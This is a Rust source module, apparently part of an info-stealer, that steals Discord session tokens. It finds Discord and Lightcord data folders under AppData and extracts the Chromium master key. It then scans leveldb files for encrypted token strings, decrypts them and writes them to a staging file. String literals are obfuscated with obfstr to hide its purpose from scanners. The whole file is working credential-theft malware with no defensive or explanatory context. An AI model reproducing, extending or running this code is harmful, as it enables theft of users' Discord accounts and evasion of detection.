use crate::alloc::borrow::ToOwned;
use alloc::string::String;
use alloc::vec::Vec;
use obfstr::obfstr as s;
use tasks::{parent_name, Task};
use utils::base64::base64_decode;
use utils::browsers::chromium;
use utils::browsers::chromium::extract_master_key;
use utils::path::{Path, WriteToFile};

pub(super) struct DiscordTask;

impl Task for DiscordTask {
    parent_name!("Discord");

    unsafe fn run(&self, parent: &Path) {
        let mut tokens = collect_tokens(&get_discord_paths());
        tokens.sort();
        tokens.dedup();
        
        if tokens.is_empty() {
            return
        }

        let _raw_tokens = tokens
            .join("\n")
            .write_to(parent / s!("_raw.txt"));
    }
}

fn get_discord_paths() -> [Path; 4] {
    let appdata = Path::appdata();

    [
        &appdata / s!("discord"),
        &appdata / s!("discordcanary"),
        &appdata / s!("Lightcord"),
        &appdata / s!("discordptb"),
    ]
}

fn collect_tokens(paths: &[Path]) -> Vec<String> {
    let mut result = Vec::new();

    for path in paths {
        if !path.is_exists() {
            continue
        }

        if let Some(master_key) = unsafe { extract_master_key(path) } {
            let scan_path = path / s!("Local Storage") / s!("leveldb");

            if !(scan_path.is_exists() && scan_path.is_dir()) {
                continue
            }

            if let Some(tokens) = scan_tokens(&scan_path, &master_key) {
                result.extend(tokens);
            }
        }
    }

    result
}

fn scan_tokens(scan_path: &Path, master_key: &[u8]) -> Option<Vec<String>> {
    let mut result = Vec::new();

    let scannable = scan_path.list_files_filtered(&|file| {
        file.extension().map(|ext| {
            ext == s!("ldb") || ext == s!("log")
        }).unwrap_or(false)
    })?;

    for entry in scannable {
        let content = entry.read_file().unwrap();
        let encrypted_tokens = extract_encrypted_token_strings(&content);
        
        for encrypted_token in encrypted_tokens {
            if let Some(decrypted) = decrypt_token(encrypted_token, &master_key) {
                result.push(decrypted);
            }
        }
    }
    
    Some(result)
}

#[inline(always)]
fn decrypt_token(token_slice: &[u8], master_key: &[u8]) -> Option<String> {
    let decoded = base64_decode(token_slice)?;
    let decrypted = unsafe { chromium::decrypt_data(&decoded, master_key) }?;
    Some(decrypted)
}

fn extract_encrypted_token_strings(input: &[u8]) -> Vec<&[u8]> {
    const PREFIX: &[u8] = b"dQw4w9WgXcQ:";
    const MAX_LOOKAHEAD: usize = 500;
    let mut result = Vec::new();

    let mut i = 0;
    while i <= input.len().saturating_sub(PREFIX.len()) {
        if &input[i..i + PREFIX.len()] == PREFIX {
            let content_start = i + PREFIX.len();
            let max_end = (content_start + MAX_LOOKAHEAD).min(input.len());

            if let Some(rel_end) = input[content_start..max_end]
                .iter()
                .position(|&b| b == b'"')
            {
                let content_end = content_start + rel_end;
                result.push(&input[content_start..content_end]);
                i = content_end + 1;
            } else {
                i += PREFIX.len();
            }
        } else {
            i += 1;
        }
    }
    
    result
}